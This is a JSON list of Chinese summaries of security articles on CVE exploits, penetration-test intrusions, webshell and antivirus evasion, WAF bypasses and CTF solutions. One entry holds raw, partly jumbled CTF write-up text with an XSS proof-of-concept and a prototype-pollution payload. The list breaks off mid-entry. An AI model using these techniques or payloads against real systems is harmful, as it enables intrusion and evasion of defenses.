[
    {
        "page_content": "该文档分析了 CVE-2020-26217 和 CVE-2020-26259 两个 Xstream 漏洞，它们利用了 Java 对象序列化和反序列化的机制，通过精心构造的 XML 输入，攻击者可以执行远程代码或删除任意文件。漏洞的根源在于 Xstream 在处理特定类型的对象时存在安全问题，导致攻击者可以控制反序列化过程并触发恶意代码执行或文件删除。",
        "FileName": "8694-CVE-2020-2621726259 Xstream远程代码执行任意文件删除漏洞分析.pdf"
    },
    {
        "page_content": "该文档介绍了如何使用 CodeQL 数据流复现 Apache Kylin 命令执行漏洞。它定义了漏洞的 sink 和 source，并使用 CallTaintStep 类来保证调用关系。通过分析数据流，作者发现了一个绕过 checkParameterWhiteList 方法的新 CVE。该文档强调了使用 CodeQL 数据流分析漏洞的便利性，并鼓励读者尝试分析其他未公开的漏洞。",
        "FileName": "8240-如何用CodeQL数据流复现 apache kylin命令执行漏洞.pdf"
    },
    {
        "page_content": "该文档记录了一次攻防演练，其中攻击者通过信息收集、SSO爆破、Jeecg getshell、密码喷洒和DCSync等技术，成功获取了域控权限。演练重点强调了弱口令在网络安全中的严重后果，以及攻击者如何利用基础操作和已知漏洞来渗透网络。",
        "FileName": "12466-小记某攻防演练--弱口令引发的域控沦陷.pdf"
    },
    {
        "page_content": "本文讨论了在攻防场景中免杀 Webshell 的应用思路，重点介绍了 ASPX 和 ASP 类型 Webshell 的免杀技术。通过利用 Unicode 编码、空字符串连接、头部替换、特殊符号和注释等特性，可以对 Webshell 内容进行处理，使其绕过常见的 Web 应用防火墙 (WAF) 检测。此外，文章还提供了利用中间件绕过 WAF 写入 Webshell 的方法，并展示了具体示例。",
        "FileName": "11953-关于webshell免杀的应用思路.pdf"
    },
    {
        "page_content": "该文档记录了作者在渗透测试中对一台域内 Windows XP 机器进行攻击的过程。作者通过寻找域控 DNS 服务器、执行命令、查看进程和绕过杀软，最终获得了对该机器的远程控制。",
        "FileName": "8533-半途而废的测试(三).pdf"
    },
    {
        "page_content": "该文档分析了 Django CVE-2020-9402 漏洞，该漏洞是由于 GIS 查询中 tolerance 参数未经验证导致的 SQL 注入。攻击者可以通过构造恶意查询来执行任意 SQL 命令或进行 XML 外部实体 (XXE) 攻击。官方修复方法是添加值函数来检查 tolerance 参数是否为数字。",
        "FileName": "7403-Django CVE-2020-9402 Geo SQL注入分析.pdf"
    },
    {
        "page_content": "本文主要介绍了通过全局钩子实现进程隐藏的两种方法：利用全局钩子 SetWindowsHookEx 和 AppInit_DLLs 注册表键值实现 globalAPIhook。文章详细介绍了这两种方法的原理、实现步骤和效果展示，并讨论了它们的局限性。",
        "FileName": "10256-Window向之全局Hook实现进程隐藏.pdf"
    },
    {
        "page_content": "这篇文档主要介绍了在内网渗透中常用的工具、方法和思路，包括代理工具 NPS、内网穿透工具 frp、EW 和 Invoke-SocksProxy，以及在域内信息收集和横向扩展执行命令的方法，如 psexec、wmiexec、pth 和导出 ntds.dit、域 hash 和 DNS 记录。",
        "FileName": "9190-菜菜鸡的初体验之内网渗透.pdf"
    },
    {
        "page_content": "该文档详细介绍了在三层网络环境靶场中进行渗透测试的步骤，包括信息收集、漏洞利用、提权和内网渗透。渗透者通过文件包含漏洞获取webshell，利用脏牛漏洞提权，并通过SQL注入和Tomcat弱口令获取内网服务器权限，最终在域控中找到flag。",
        "FileName": "8519-记一次三层网络环境的靶场渗透.pdf"
    },
    {
        "page_content": "该文档讨论了 PHP 中的 Session Upload Progress 功能，该功能允许在文件上传期间监测上传进度。通过利用此功能，攻击者可以在目标主机上初始化 Session，从而绕过文件包含漏洞的限制，并通过条件竞争在服务器上创建恶意 Session 文件。利用此技术，攻击者可以上传恶意会话，其中包含 PHP 代码，以在目标主机上执行任意代码或写入 Webshell。",
        "FileName": "9545-浅谈 SESSION_UPLOAD_PROGRESS 的利用.pdf"
    },
    {
        "page_content": "该文档介绍了如何使用汇编语言编写一个简单的 Windows Shellcode，并详细解释了编写位置无关代码的注意事项，包括避免使用空字节、字符串直接偏移以及特定字符。文档还提供了在 Windows 中加载 DLL 和寻址函数的步骤，并提供了汇编代码示例和编译说明。",
        "FileName": "10078-用ASM编写一个简单的Windows Shellcode思路总结.pdf"
    },
    {
        "page_content": "该文档详细介绍了用于防御网站攻击的 AWD 防御技术，包括压缩、解压缩、备份、上传下载、SSH、FTP、数据库备份、信息收集、口令更改、监控文件是否被删除或篡改、创建免死金牌、获取当前所有文件路径、计算计算机文件 MD5 值、获取所有文件 MD5、备份所有文件、防止任意文件被修改、还原被修改文件、搜索可能由攻击者传入的恶意文件、清除不死马、使用 alias 欺骗、回复重命名操作、利用 .htaccess 配置文件禁止 php 文件执行、杀弹 shell、端口管理、提权漏洞、漏洞修复、WAFRSS 等技术。",
        "FileName": "12659-AWD防御技术小结详解.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 Windows 内核中的 UAF（使用后释放）漏洞来在 R3 中提权。该漏洞利用了驱动程序中一个全局指针的回调函数，该指针在释放后没有被置零。通过堆喷射，攻击者可以覆盖该回调函数，并在其被调用时执行提权 shellcode，从而获得 system 权限。",
        "FileName": "7922-HEVD系列Windows内核漏洞学习笔记0.pdf"
    },
    {
        "page_content": "该文档分析了某微盘源码中的四个漏洞，包括前台 SQL 注入、SSRF、管理后台登录凭证伪造和后台任意文件上传。这些漏洞可能导致攻击者获取敏感信息、执行任意代码或上传恶意文件。",
        "FileName": "8263-某微盘源码审计.pdf"
    },
    {
        "page_content": "该文档详细介绍了 Hayyim-CTF-2022 Web 竞赛中的六个挑战，包括 XSS、0day 漏洞、SQL 注入、变量覆盖、HTML 解析绕过、文件上传和 Phar getshell。文档分析了每个挑战的主题、内容和解决方法，并提供了代码示例和参考链接。",
        "FileName": "10901-Hayyim-CTF-2022 Web全解析.pdf"
    },
    {
        "page_content": "该文档讲述了一个安全研究人员通过任意文件上传漏洞渗透到服务器，但无法执行代码，随后通过跨目录操作替换了 root 用户的 SSH 公钥，最终成功获取服务器权限的故事。文章强调了信息收集和多尝试的重要性，并建议将 SSH 端点开放到公网时要谨慎。",
        "FileName": "12028-记一处任意文件上传没拿到webshell却拿到服务器的故事.pdf"
    },
    {
        "page_content": "文档介绍了 API 安全漏洞靶场 crapi，包括其基本介绍、解题思路和 14 个挑战的详细解法。这些挑战涵盖了常见的 API 安全漏洞，如批量分配、SSRF、注入和未经身份验证的访问，并提供了具体的攻击方法和解决措施。",
        "FileName": "11789-API安全漏洞靶场crapi的基本介绍和解题思路-第二篇.pdf"
    },
    {
        "page_content": "**主题：** Joomla 4.0.0 至 4.2.7 中的未授权 Rest API 访问漏洞（CVE-2023-23752）\n\n**内容：** 该漏洞允许攻击者通过发送一个包含 \"public=true\" 参数的请求来绕过身份验证并访问 Joomla Rest API，从而获取敏感信息，例如数据库凭据。该漏洞影响 Joomla 4.0.0 至 4.2.7 版本，并且可以通过访问受影响网站的 \"/api/index.php\" 路由来利用。",
        "FileName": "12175-Joomla(CVE-2023-23752)——一个请求参数 打穿Rest API.pdf"
    },
    {
        "page_content": "该文档分析了 Wuzhicms PHP 代码中的多个漏洞，包括 SQL 注入、任意文件写入、目录遍历、任意文件删除、后台 SQL 注入、RCE 和敏感信息泄露。这些漏洞存在于代码中，允许攻击者执行恶意操作，例如注入恶意代码、删除文件、遍历目录、泄露敏感信息或执行任意命令。",
        "FileName": "12016-PHP代码审计之wuzhicms.pdf"
    },
    {
        "page_content": "该文档分析了加密 Webshell \"冰蝎\" 的流量识别方法，重点关注其密钥获取、Cookie 解析和动态加载过程中的漏洞。通过比较两次请求的差异，截取加密数据；识别 Cookie 属性的异常；以及检测动态加载的固定数据包大小，可以实现对冰蝎流量的 100% 识别。",
        "FileName": "7606-红蓝对抗——加密Webshell“冰蝎” 流量 100%识别.pdf"
    },
    {
        "page_content": "该文档分析了 Liferay Portal 中的 JSON 反序列化漏洞 (CVE-2020-7961)，该漏洞允许攻击者通过发送恶意 JSON 数据包来执行远程代码。漏洞存在于 JSONWebServiceActionImpl 类的 _prepareParameters() 方法中，该方法将 JSON 数据反序列化为 Java 对象，从而导致反序列化漏洞。攻击者可以通过控制反序列化的类来执行任意代码。",
        "FileName": "7499-CVE-2020-7961 Liferay Portal 反序列化RCE分析.pdf"
    },
    {
        "page_content": "该文档分析了 IBOS 酷办公后台命令执行 GetShell 漏洞，该漏洞允许攻击者通过构造数据库备份文件名来执行命令，从而获取 Webshell。漏洞复现步骤包括登录后台、配置数据库备份、拦截数据包并修改文件名参数，然后放包即可在根目录发现 Webshell。漏洞分析发现该漏洞利用了 shell_exec 函数执行命令，其中变量 $dumpFile 可控，通过构造文件名绕过过滤即可触发漏洞。",
        "FileName": "9115-IBOS酷办公后台命令执行GetShell分析.pdf"
    },
    {
        "page_content": "该文档主要介绍了如下内容：\n                    1. 分析了如下文档的主题和内容：\n                    - 安洵杯 2020  官⽅ Writeup(Web/Misc/Crypto) - D0g3 安洵杯 2020  官⽅ Writeup(Web/Misc/Crypto) - D0g3\n                    - 1.登录 安洵杯 2020  官⽅ Writeup(Web/Misc/Crypto) - D0g3 安洵杯 2020  官⽅ Writeup(Web/Misc/Crypto) - D0g3 0xdawn   /  2020-12-03 09:50:12  /  浏览数  30879 本⽂由   @D0g3   编写 i-SOON_CTF_2020  部分题⽬环境 / 源码后续将在 Github 开源 项⽬地址 poc: http://47.108.162.43:3000/?data={\"__proto__\":{\"innerText\":\"<img\tsrc=\"\"\tonerror=alert`1`>//\"},\"text\":\"<h>\"} santinize-html 第 16879 ⾏， text 与 frame.innerText 整合为 result ，作为 return 的结果 if\t(options.selfClosing.indexOf(name)\t!==\t-1)\t{ \t\t\t\tresult\t+=\t\"\t/>\" }\telse\t{ \t\t\t\tresult\t+=\t\">\"; \t\t\t\tif\t(frame.innerText\t&&\t!hasText\t&&\t!options.textFilter)\t{ \t\t\t\t\t\t\t\tresult\t+=\tframe.innerText; \t\t\t\t\t\t\t\taddedText\t=\ttrue \t\t\t\t} } 只要是任意⽩名单标签都可以在其后加⼊任意内容 \t ddddhm \t 队伍师傅⽤ jq 的⾮预期 Web XSS 预期 ⾮预期jquery 在 init 的时候会⾃动进⾏⼀次 paseHTML( 即使没有调⽤任何⽅法 ) 。 jquery yyds 题⽬考点： 1 .  Nodejs 代码审计 2 .  原型链污染分析 解题思路： 获取源码 由于 express-static 配置错误，导致可以任意查看静态⽂件 直接访问获取源码与环境： /app.js /package.json validator 原型链污染漏洞 出题的思路来⾃于 XNUCA2020 的⼀道原型链污染题，原题的正解是污染原型链 value 值为空，但是 0ops 的师傅在解题的过程中做 到了任意原型链污染，这题就是以这个任意原型链污染为基础的。 ( 师傅们在做题的时候应该是可以直接搜到这个 payload 的 ) 参考原⽐赛的 wp ： oooooooldjs 针对任意原型链污染这个点，深⼊的分析在后⾯。 题⽬部分源码： Validator 题⽬信息if \t ( req . body . password \t == \t \"D0g3_Yes!!!\" ){ \t\t\t\t\t\t\t\t console . log ( info . system_open ) \t\t\t\t\t\t\t\t if \t ( info . system_open \t == \t \"yes\" ){ \t\t\t\t\t\t\t\t\t\t\t\t const \t flag \t = \t readFile ( \"/flag\" ) \t\t\t\t\t\t\t\t\t\t\t\t return \t res . status ( 200 ). send ( flag ) \t\t\t\t\t\t\t\t } else { \t\t\t\t\t\t\t\t\t\t\t\t return \t res . status ( 400 ). send ( \"The\tlogin\tis\tsuccessful,\tbut\tthe\tsystem\tis\tunder\ttest\tand\tnot \t open...\" ) \t\t\t\t\t\t\t\t } \t\t\t\t } else { \t\t\t\t\t\t\t\t return \t res . status ( 400 ). send ( \"Login\tFail,\tPassword\tWrong!\" ) \t\t\t\t } 这⾥只有⼀个简单的 info.system_open 的判断，所以我们只需要构造出能够污染 info.system_open 的 payload 即可。 最终构造出的 payload 如下： {\"password\":\"D0g3_Yes!!!\",\t\"a\":\t{\"__proto__\":\t{\"system_open\":\t\"yes\"}},\t\"a\\\"].__proto__[\\\"system_open\":\t\"yes\"\t} 测试例⼦ : const \t express \t = \t require ( 'express' ) const \t app \t = \t express () const \t port \t = \t 9000 app . use ( express . json ()) app . use ( express . urlencoded ({ \t\t\t\t extended : \t true })) const \t { \t\t\t\t body , \t\t\t\t validationResult } \t = \t require ( 'express-validator' ) middlewares \t = \t [ \t\t\t\t body ( '*' ). trim () \t //\t 对所以键值进⾏ trim 处理 ] app . use ( middlewares ) app . post ( \"/user\" , \t ( req , \t res ) \t => \t { \t\t\t\t const \t foo \t = \t \"hellowrold\" \t\t\t\t return \t res . status ( 200 ). send ( foo ) }) app . listen ( port , \t () \t => \t { \t\t\t\t console . log ( `server\tlistening\ton\t ${ port } ` ) }) 依赖包版本： express-validator 6.6.0  原型链污染详细分析 测试⽤例npm\tinit npm\tinstall\tlodash@4.17.16 npm\tinstall\texpress-validator@6.6.0 npm\tinstall\texpress express-validator 的过滤器 (sanitizer) 的实现流程进⾏⼀个分析。 在分析这个原型链污染漏洞之前，我们先对 express-validator 的过滤器 (sanitizer) 的实现流程进⾏⼀个分析。 在 src/middlewares/validation-chain-builders.js ⽂件中找到 body 的实现 传递到了 check_1.check ⽅法中，跟⼊ check.js ⽂件 location 传递进来后传递到 setLocations ⽅法⾥创建了⼀个 builder 对象，并传⼊到 chain_1.SanitizersImpl ⽅法中。对于 return ，在题 ⽬的 Wirteup 中有以下的描述： 先看 return 的地⽅， check 函数⾥的 middleware 就是 express-validator 最终对接 express 的中间件。 utils_1.bindAll 函数做的事情就是把对象原型链上的函数绑定成了对象的⼀个属性，因为 Object.assign 只 做浅拷⻉， utils.bindAll 之后 Object.assign 就可以把 sanitizers 和 validators 上⾯的⽅法都拷⻉到 middleware 上⾯了，这样就能通过这个 middleware 调⽤所有的验证和过滤函数。 针对 bindAll ，我个⼈的理解是： bindAll 函数就是把需要调⽤的⽅法都绑定到 middleware 上进⽽实现链式调⽤。 什么是链式调⽤： https://juejin.im/post/6844904030221631495 bindAll ⽅法 :  https://my.oschina.net/cangy/blog/301038 传⼊ bindAll 的参数值是通过 Chain_1.SanitizersImpl 返回的，可以通过 chain/index.js 确定到这个函数的定义位置为 src/chain/sanitizers- impl.js 。 过滤器 (sanitizer) 实现流程在这个类中存在很多的过滤器 (sanitizer) ，过滤器实现的⽅法都调⽤了 this.addStandardSanitization() 将过滤器传⼊到 sanitization_1.Sanitization() ⽅法中，得到的结果最终传递给 this.builder.addItem() 。 先来看 sanitization_1.Sanitization() ⽅法，位置在： src/context-items/sanitization.js ： 这个 Sanitization 类中的 run ⽅法最终通过调⽤ sanitizer ⽅法设置了 context 的值。 (context 后⾯的处理过程在漏洞分析部分 ) 再来看 this.builder.addItem() 做了什么，位置在 src/chain/sanitizers- impl.js 就是把传⼊进来的值压⼊ this.stack 栈中。 回到 Sanitization 类中的 run ⽅法，这个 run ⽅法是在哪调⽤的呢？再看到 check.js ，这⾥创建了⼀个 runner 对象，并在 middleware ⾥调⽤了 run ⽅法： 同样可以从 chain/index.js 中找到实现 runner.run ⽅法的具体位置为： 这⾥可以看到是从 context.stack ⾥⾯循环遍历了 contextItem ，并调⽤了其 run ⽅法。在这条循环语句处下断点查看⼀下 context 的内 容：在 stack ⾥⾯就是包含了我们所调⽤的过滤器，⽽这个 context.stack 也就是 this.builder.addItem() 所设置的值。 这就是完整的 express-validator 的过滤器 (sanitizer) 的实现流程， wp 中对这个过程有⼀个总结： express-validator 的做法是把各种 validator 和 sanitizers 的⽅法绑定到 check 函数返回的 middleware 上，这 些 validator 和 sanitizer 的⽅法通过往 context.stack 属性⾥⾯ push context-items ，最终在 ContextRunnerImpl.run() ⽅法⾥遍历 context.stack 上⾯的 context-items ，逐⼀调⽤ run ⽅法实现 validation 或者是 sanitization 我这⾥画了⼀个流程图来梳理这⼀过程： ( 这个流程图画的⽐较复杂，如果你尝试跟过⼀遍的话再来看这个流程图就会⽐较容易理解⼀些 https://snyk.io/vuln/S",
        "FileName": "8581-安洵杯2020 官方Writeup(WebMiscCrypto) - D0g3.pdf"
    },
    {
        "page_content": "该文档分析了 F5 BIG-IP iControl REST API 中的认证绕过漏洞 (CVE-2022-1388)，该漏洞允许攻击者绕过 Apache 和 Jetty 的认证机制，从而访问受保护的资源。文档详细介绍了漏洞的原理、绕过方法以及 F5 发布的修复程序。",
        "FileName": "11418-F5 BIGIP CVE-2022-1388 认证绕过漏洞分析.pdf"
    },
    {
        "page_content": "本文主要介绍了代码审计的入门知识，包括代码审计的定义、方法和工具。文章建议初学者使用xdebug工具进行代码审计，并提供了几个代码审计的案例，包括二次编码注入、文件包含漏洞、XSS漏洞、文件上传漏洞、命令执行漏洞和文件删除漏洞。此外，文章还介绍了MVC框架的代码审计方法，强调了熟悉路由、数据库内核和参数传递的重要性。",
        "FileName": "10497-浅谈代码审计.pdf"
    },
    {
        "page_content": "**主题：** CVE-2020-15148 Yii2 反序列化 RCE POP 链分析\n\n**内容：** 该文档分析了 Yii2 框架中一个反序列化远程代码执行（RCE）漏洞，该漏洞允许攻击者通过精心构造的请求执行任意代码。漏洞利用链涉及多个类和方法，包括 `yii\\db\\BatchQueryResult`、`Faker\\Generator` 和 `yii\\rest\\CreateAction`，最终导致执行系统命令。",
        "FileName": "8307-CVE-2020-15148 Yii2反序列化RCE POP链分析.pdf"
    },
    {
        "page_content": "该文档介绍了如何使用 Brida 插件在 Android 渗透测试中对加密数据包进行解密和加密。它提供了详细的分步指南，包括安装 Brida、编写 JavaScript 脚本、调用 APK 加密解密函数以及编写相应的插件脚本。通过这些步骤，用户可以轻松地实现一键加密和一键解密操作，从而简化 Android 渗透测试过程。",
        "FileName": "7562-Android渗透测试frida——Brida插件加解密实战演示.pdf"
    },
    {
        "page_content": "本文档介绍了如何修改BurpSuite插件Auth Analyzer Plus，以实现跨网站越权测试。通过修改插件代码，用户可以替换请求中的Cookie和Host，从而模拟不同用户访问不同网站，并测试越权漏洞。该方法适用于使用相同系统的多个网站，允许用户使用一个网站的管理员权限来测试另一个网站的越权漏洞。",
        "FileName": "12363-burpsuite 越权分析插件Auth Analyzer Plus.pdf"
    },
    {
        "page_content": "该文档分析了正则回溯的概念，并详细介绍了如何利用正则回溯绕过 maccms v8 80w 字符的 RCE 漏洞。该漏洞利用了 PCRE 中 pcre.backtrack_limit 选项的限制，通过在正则表达式中填充大量垃圾字符来触发回溯，从而绕过 360 WAF 的 SQL 检测模块。最终，攻击者可以通过可控参数 wd 传入恶意 payload，绕过判断并执行 eval 语句，实现远程代码执行。",
        "FileName": "7037-maccms v8 80w 字符的 RCE 分析.pdf"
    },
    {
        "page_content": "该文档详细介绍了红队攻防实战中从外网突破到内网，绕过杀软和防护，最终拿下目标的流程和技术，包括代码审计、SQL注入、webshell上传、提权、信息收集、代理出网、拿下邮服、攻击Exchange服务器、获取域控权限等。",
        "FileName": "10244-红队攻防实战系列一之Cobalt Strike.pdf"
    },
    {
        "page_content": "该文档分析了 JfinalCMS 中的三个漏洞：任意文件上传漏洞、存储型 XSS 漏洞和 SSTI 模板注入漏洞。这些漏洞允许攻击者上传恶意文件、执行任意代码和注入恶意脚本。文档详细描述了漏洞的成因、影响和利用方法，并提供了缓解措施。",
        "FileName": "8695-一次意外的代码审计----JfinalCMS审计.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用 OnlyOffice Web 套接字进行未经身份验证的远程代码执行，包括漏洞利用链、缓解措施和分配的 CVE 补丁。",
        "FileName": "12008-CVE-2021-43444 到 43449：利用 ONLYOFFICE Web 套接字进行未经身份验证的远程代码执行.pdf"
    },
    {
        "page_content": "DedeCMS_V5.8.1 中的 ShowMsg 模板注入漏洞允许攻击者通过注入恶意代码来执行任意命令，该漏洞源于 include\\common.func.php 中 ShowMsg 参数的处理，导致在写入临时模板缓存文件时，可控函数被包含，从而实现代码执行。",
        "FileName": "10331-DedeCMS_V5.8.1 ShowMsg 模板注入远程代码执行漏洞分析.pdf"
    },
    {
        "page_content": "该文档探讨了SSRF（服务器端请求伪造）检测技术，重点介绍了两种工具：collaborator-everywhere和Blind-SSRF。它分析了这些工具的原理，并提出了改进collaborator-everywhere以提高覆盖范围和被动扫描能力的建议。该文档还提供了改进后工具的实际使用结果，并讨论了进一步改进的可能性。",
        "FileName": "11050-SSRF检测的一些思考.pdf"
    },
    {
        "page_content": "该文档介绍了一种利用 Fofa 爬取全网相同系统服务器并批量检测默认用户名密码的脚本编写方法，以天融信防火墙弱口令为例，通过 Fofa 搜索目标系统服务器独有特征，爬取链接，再利用脚本批量检测默认用户名密码，从而快速拿下全网弱口令。",
        "FileName": "9299-教你如何快速拿下全网弱口令.pdf"
    },
    {
        "page_content": "该文档主要介绍了 JSONP 跨域技术及其安全漏洞，包括 JSONP 劫持和 XSS 漏洞。它解释了 JSONP 的工作原理，如何利用它来实现跨域资源访问，以及如何通过自定义回调函数和不当的 Content-Type 设置来导致安全问题。文档还提供了示例代码和缓解措施，以帮助开发人员保护他们的应用程序免受这些漏洞的影响。",
        "FileName": "12744-Jsonp劫持.pdf"
    },
    {
        "page_content": "该文档主要介绍了 Python pickle 反序列化的主题和内容，包括其定义、指令集、数据格式、安全隐患和绕过方法。文中详细分析了 pickle 反序列化的过程，并提供了多个示例和漏洞利用场景，帮助读者深入理解该技术。",
        "FileName": "11807-最近碰到的 Python pickle 反序列化小总结.pdf"
    },
    {
        "page_content": "本文介绍了作者在参加 bsrc 和 asrc webshell 挑战赛时绕过检测的技巧。作者通过利用 $_SERVER、getenv(\"QUERY_STRING\") 和 $GLOBALS 从外部获取值，绕过了检测环境和实际环境运算结果不一致的差异性，从而提交了多个绕过样本。",
        "FileName": "10510-bsrc和asrc的webshell挑战赛绕过技巧.pdf"
    },
    {
        "page_content": "本文档讨论了 CobaltStrike 中编码不统一的问题，并介绍了一种通过修改代码来动态修改编码的功能。该功能允许用户在 Beacon 控制台中设置当前 Beacon 的编码，并通过图形菜单方便地操作多个 Beacon。",
        "FileName": "11055-CobaltStrike Charset Improvement.pdf"
    },
    {
        "page_content": "该文档分析了 Spring Data MongoDB 中的 CVE-2022-22980 漏洞，该漏洞是由 SpEL 表达式注入引起的，当使用 @Query 或 @Aggregation 注解进行数据库查询并使用占位符获取参数时，会触发该漏洞。漏洞的触发点是在 ParameterBindingJsonReader#bindableValueFor 方法中，在第一次参数绑定时，由于使用 ParameterBindingDocumentCodec，导致漏洞未触发，但在第二次参数绑定时，使用 DefaultSpELExpressionEvaluator，导致 SpEL 表达式注入。",
        "FileName": "11484-CVE-2022-22980 Spring Data MongoDB SpEL表达式注入.pdf"
    },
    {
        "page_content": "本文介绍了如何免杀 Windows Defender 和其他杀毒软件，使用 shellcode_launcher 加载器和 shellcode。作者通过修改源代码、添加图标和混淆代码，成功绕过了 360、火绒和 Windows Defender 的静态和动态检测。",
        "FileName": "10810-老树开新花之shellcode_launcher免杀Windows Defender.pdf"
    },
    {
        "page_content": "本文档分析了高版本JDK中JNDI注入的原理和利用方法，包括RMI和LDAP两种方式，并介绍了针对不同版本的JDK的限制和绕过技术，如使用本地类作为Reference Factory、利用Groovy的ASTTest特性、利用LDAP返回的序列化数据触发本地Gadget等。",
        "FileName": "10671-高版本JDK下的JNDI注入浅析.pdf"
    },
    {
        "page_content": "该文档分析了 Apache Commons Collections 5、6、7 版本中的 Java 反序列化漏洞，这些漏洞允许攻击者通过触发 LazyMap#get() 方法来执行任意代码。文档详细介绍了每个漏洞的利用链，包括涉及的类和方法，并提供了 POC 代码示例。",
        "FileName": "10457-通俗易懂的Java  Commons Collections 5、6、7分析.pdf"
    },
    {
        "page_content": "该文档探讨了绕过安全狗软 WAF（如某狗 4.0）进行文件上传的各种技术，包括修改 Content-Disposition 字段长度、修改文件名、添加干扰字符、使用换行符和十六进制编码，以及利用多个等号和 %00 截断。这些技术利用了 WAF 匹配规则的限制，允许攻击者上传恶意文件，绕过 WAF 的检测。",
        "FileName": "9507-文件上传bypass安全狗.pdf"
    },
    {
        "page_content": "该文档主要介绍了 Java 安全漫谈系列文章的第 9 篇，内容涉及 Java 反序列化 Commons-Collections 篇 01-CC1 链的分析和利用。文章详细讲解了如何利用 TransformedMap、LazyMap 等工具类辅助利用链，并提供了完整的 POC 代码和流程图。",
        "FileName": "12019-[Java安全]Commons Collections1初探过程的思考.pdf"
    },
    {
        "page_content": "该文档记录了作者在某网站上发现的支付漏洞，该漏洞允许用户通过修改支付金额来以较低的价格购买商品。然而，由于该网站的业务流程涉及卖家对价格的二次确认，因此该漏洞实际上无法被利用，因为卖家不太可能接受大幅降低的价格。因此，该漏洞被网站忽略，作者的报告也被拒绝。",
        "FileName": "8338-记录第二次“梅花三弄”的渗透之旅.pdf"
    },
    {
        "page_content": "该文档分析了飞趣 CMS 的二次审计，发现了 Log4j 远程代码执行漏洞和 Collections3 反序列化漏洞（失败）。利用 Log4j 漏洞，攻击者可以在注册时通过昵称字段注入恶意 payload，导致 DNSLOG 回显。Collections3 反序列化漏洞利用尝试失败，因为某些类无法被序列化。",
        "FileName": "11381-飞趣CMS二次审计.pdf"
    },
    {
        "page_content": "该文档分析了 DrayTek Vigor 路由器中存在的五个漏洞，包括未经身份验证的命令执行、栈溢出和文件上传漏洞。这些漏洞允许攻击者远程执行任意代码，访问敏感信息或修改设备配置。文档详细描述了每个漏洞的原理、利用方法和修复措施，并提供了参考链接以获取更多信息。",
        "FileName": "9317-draytek漏洞分析.pdf"
    },
    {
        "page_content": "该文档介绍了一种绕过云 WAF 和本地防火墙双重防护的任意文件上传技术。通过 host 碰撞找到真实 IP，绕过云 WAF；使用 Content-Encoding 头绕过本地防火墙的内容检测，从而实现任意文件上传。",
        "FileName": "10278-任意文件上传之绕过云waf+本地防火墙双重防护.pdf"
    },
    {
        "page_content": "本文介绍了定位和分析 DA14531 芯⽚固件收包流程的方法，并提供简单的 BLE 协议漏洞挖掘思路。通过查看 DA14531 的芯⽚⼿册，我们知道这个芯⽚使⽤的 CPU 是 Arm Cortex-M0+，我们知道 M0 的异常向量表位于 0 地址处，所以我们去看看 DA14531 ⼿册的 memory map ⼀节中是怎么定义 0 这个地址的。",
        "FileName": "9194-DA14531芯片固件逆向系列（3）- BLE收包流程分析及漏洞挖掘思路分享.pdf"
    },
    {
        "page_content": "本文分析了 SQL 盲注的效率，介绍了三种猜解字符值的方法：遍历法、二分法和与运算。效率分析表明，二分法和与运算的效率高于遍历法，其中二分法平均需要 6.6 次比较，与运算需要 7 次比较，而遍历法需要 46 次比较。在实际应用中，建议使用二分法或与运算来猜解 SQL 盲注中的字符值，以提高效率。",
        "FileName": "7575-sql盲注的效率分析.pdf"
    },
    {
        "page_content": "Kubernetes 中的 RBAC（基于角色的访问控制）允许管理员通过分配资源对象访问权限来授权用户。如果分配了过大的权限，攻击者可以滥用 RBAC 来提升权限，访问敏感数据或执行恶意操作，例如创建挂载根目录的 Pod 或窃取凭据。",
        "FileName": "11476-K8s提权之RBAC权限滥用.pdf"
    },
    {
        "page_content": "该文档分析了 Bludit CMS 中的两个漏洞：一个后台 RCE 漏洞和一个后台插件安装漏洞。RCE 漏洞允许攻击者通过修改数据并将其写入文件中来执行任意代码，而插件安装漏洞允许攻击者通过上传恶意压缩包来写入木马文件。",
        "FileName": "10082-Bludit cms漏洞挖掘.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 SnakeYaml 在不出网的情况下进行远程代码执行 (RCE)，通过修改 FastJSON 和 ScriptEngineManager 的利用链，并利用 SnakeYaml 的反序列化机制，最终实现仅依赖 JDK 即可完成 RCE。",
        "FileName": "10655-SnakeYaml 之不出网RCE.pdf"
    },
    {
        "page_content": "该文档介绍了在 Windows 和 Linux 系统中远程下载文件的各种方法，包括使用 PowerShell、certutil、BITSAdmin、FTP、msiexec、mshta、Rundll32、Regsvr32、wget、cURL、nc、Python、Perl、Ruby、PHP、wget、cURL、nc、ftp 和 tftp 等工具和命令。",
        "FileName": "7937-windowsLinux文件下载方式汇总.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2022-22947 漏洞，该漏洞影响 Spring Cloud Gateway，允许攻击者通过 SpEL 表达式注入实现远程代码执行。文档详细介绍了漏洞原理、调试分析、武器化研究和内存 Webshell 攻击技术，并提供了 Spring Controller 内存 Webshell 和 Spring WebFilter 内存 Webshell 的实现代码。",
        "FileName": "11331-从CVE-2022-22947到Spring WebFlux内存马与哥斯拉.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 ManageEngine JDBC RCE 漏洞在 ManageEngine 产品中实现远程代码执行。该漏洞利用了 Apache Batik 组件中的一个 XSS 漏洞，通过创建恶意对象来加载恶意 JAR 包，从而实现 RCE。然而，该漏洞需要一个随机哈希值，该哈希值在产品安装时自动生成，这限制了未经授权的 RCE 能力，使其仅限于具有读取权限的管理员帐户。",
        "FileName": "12380-ManageEngine JDBC RCE.pdf"
    },
    {
        "page_content": "该文档是一篇博客文章，主题是渗透测试。文章分享了一次通过语音聊天软件 YY 发现的渗透测试案例，介绍了信息收集和渗透测试的技巧，并强调了渗透测试的重要性。",
        "FileName": "7203-记一次YY出来的渗透测试.pdf"
    },
    {
        "page_content": "该文档讨论了 docx 格式的 XML 外部实体注入 (XXE) 漏洞，介绍了三种利用方法：在 XML 声明中添加实体声明、在 docProps/app.xml 中添加实体声明，以及使用 OLE 对象读取文件。该文档还提供了利用这些方法的示例代码和拓展阅读材料。",
        "FileName": "11203-浅谈一种特殊格式的xxe.pdf"
    },
    {
        "page_content": "本文通过多个 poc，结合 ftp 协议底层和 php 源码，分析了在 php 中利用 ftp 伪协议攻击 php-fpm，从而绕过 disable_functions 的攻击方法，并在文末复现了 [蓝帽杯 2021]One Pointer PHP 和 [WMCTF2021] Make PHP Great Again And Again php.ini 配置：",
        "FileName": "10271-深入 FTP 攻击 php-fpm 绕过 disable_functions.pdf"
    },
    {
